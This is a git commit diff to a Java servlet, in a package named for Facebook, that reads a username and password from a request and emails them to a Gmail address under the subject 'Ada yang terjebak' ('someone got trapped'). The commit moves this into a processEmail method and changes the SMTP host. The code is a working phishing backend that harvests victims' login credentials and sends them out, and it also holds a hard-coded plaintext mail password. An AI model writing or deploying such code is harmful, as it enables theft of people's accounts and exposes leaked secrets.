c01b9c8a300d6ac4663aecdcdb318a33b10b20e8
gunungloli666 <gunungloli@gmail.com>
2019-09-03 16:33:39 +0800

    fix smtp googlemail

--- src/com/fjr/action/facebook/ProcessRequest.java
+++ src/com/fjr/action/facebook/ProcessRequest.java
@@ -18,33 +18,8 @@ public class ProcessRequest  extends HttpServlet{
 	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
 		String nama = req.getParameter("username");
 		String password = req.getParameter("password");
-		boolean success = true; 
 		if (nama != null && password != null) {
-
-			Properties mailServerProperties = System.getProperties();
-			mailServerProperties.put("mail.smtp.port", "587");
-			mailServerProperties.put("mail.smtp.auth", "true");
-			mailServerProperties.put("mail.smtp.starttls.enable", "true");
-
-			Session getMailSession = Session.getDefaultInstance(mailServerProperties, null);
-			MimeMessage generateMailMessage = new MimeMessage(getMailSession);
-			try {
-				generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
-				generateMailMessage.setSubject("Ada yang terjebak");
-				String emailBody = "nama: "  + nama + "| pasword: "+ password;
-				generateMailMessage.setContent(emailBody, "text/html");
-
-				Transport transport = getMailSession.getTransport("smtp");
-
-				transport.connect("smtp.gmail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
-				transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
-				transport.close();
-
-			}catch(Exception e) {
-				System.out.println("mail.sending error"); 
-				e.printStackTrace();
-				success = false; 
-			}
+			processEmail(nama, password);
 		}
 
 
@@ -56,5 +31,35 @@ public class ProcessRequest  extends HttpServlet{
 			e.printStackTrace();
 		}
 		
-	}	
+	}
+	
+	public void processEmail(String nama, String password) {
+
+		Properties mailServerProperties = System.getProperties();
+		mailServerProperties.put("mail.smtp.port", "587");
+		mailServerProperties.put("mail.smtp.auth", "true");
+		mailServerProperties.put("mail.smtp.starttls.enable", "true");
+
+		Session getMailSession = Session.getDefaultInstance(mailServerProperties, null);
+		MimeMessage generateMailMessage = new MimeMessage(getMailSession);
+		try {
+			generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
+			generateMailMessage.setSubject("Ada yang terjebak");
+			String emailBody = "nama: "  + nama + "| pasword: "+ password;
+			generateMailMessage.setContent(emailBody, "text/html");
+
+			Transport transport = getMailSession.getTransport("smtp");
+
+			transport.connect("smtp.googlemail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
+			transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
+			transport.close();
+
+		}catch(Exception e) {
+			System.out.println("mail.sending error"); 
+			e.printStackTrace();
+		}
+
+	}
+	
+	
 }
